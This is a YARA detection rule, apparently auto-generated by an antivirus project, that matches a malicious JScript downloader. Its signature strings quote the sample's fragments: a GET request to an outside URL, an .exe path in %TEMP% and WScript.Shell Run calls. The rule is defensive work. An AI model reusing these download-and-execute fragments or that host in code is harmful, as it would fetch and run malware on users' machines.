rule sig_20160328_b40487ee3780e868a55214937155e1f9 {
  meta:
    description = "datamaliciousorder - file 20160328_b40487ee3780e868a55214937155e1f9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8e2d0b36d4ed7775aabfe48ec95fb284a0a0aad3cd2b49f2b85c2320744eff25"

  strings:
    $s1  = "function Nihfabfxw() {return Abfofhgba[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"FJHXJ0zZr7Zma.exe\";};" fullword ascii
    $s2  = "Bwiajhazk[Grmfnbhpxt](\"GET\", \"http://princesse-hippie.com/m6yaf\", false);" fullword ascii
    $s3  = "do {WScript[Mumqv](Gnbcpeq() * 11)} while (Bwiajhazk[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "function Nfrwwcgt(Dnjzhgs, Vbewlvgat){return Dnjzhgs - Vbewlvgat;};" fullword ascii
    $s5  = "var Abfofhgba = function Iuatlqqif() {return WScript[Agqpqss](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Oscimmoqhh() {return ((Derxbeiwwa == true) && (Derxbeiwwa == Jwhfecsd)) ? 1 : Scxuz;};" fullword ascii
    $s7  = "function Fhzozvv(Ithsm){Abfofhgba[\"Run\"](Ithsm, Scxuz, Scxuz);};" fullword ascii
    $s8  = "function Obkxgs()" fullword ascii
    $s9  = "function Tprefpfhme(Peyavmsih) {var Jvrfgwmahx = (1, 2, 3, 4, 5, Peyavmsih); return Jvrfgwmahx;};" fullword ascii
    $s10 = "var Jwhfecsd = false;" fullword ascii
    $s11 = "return Nfrwwcgt(Vdnxlyk, Pgkgwk);" fullword ascii
    $s12 = "Jwhfecsd = true; " fullword ascii
    $s13 = "var Jxslvlcj = new this[\"Date\"]();" fullword ascii
    $s14 = "function Faeiqknxam(){return Agqpqss;};" fullword ascii
    $s15 = "function Uvteaomg(){return Fzggatujn;};" fullword ascii
    $s16 = "Derxbeiwwa = true; " fullword ascii
    $s17 = "var Derxbeiwwa = false;" fullword ascii
    $s18 = "function Gnbcpeq(){return 22;};" fullword ascii
    $s19 = "var Fbtpc = false;" fullword ascii
    $s20 = " while (Wkuubdck){" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}